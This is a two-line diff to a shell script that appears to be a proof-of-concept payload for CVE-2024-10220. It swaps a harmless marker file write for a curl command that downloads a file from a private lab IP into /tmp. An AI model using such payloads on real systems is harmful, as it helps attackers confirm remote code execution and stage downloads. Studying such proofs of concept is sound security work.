@@ -1,2 +1,2 @@
 #!/bin/sh
-echo "HOLAAAA" > /tmp/cve-2024-10220
+curl -o /tmp/hola.txt https://192.168.132.130/hola.txt
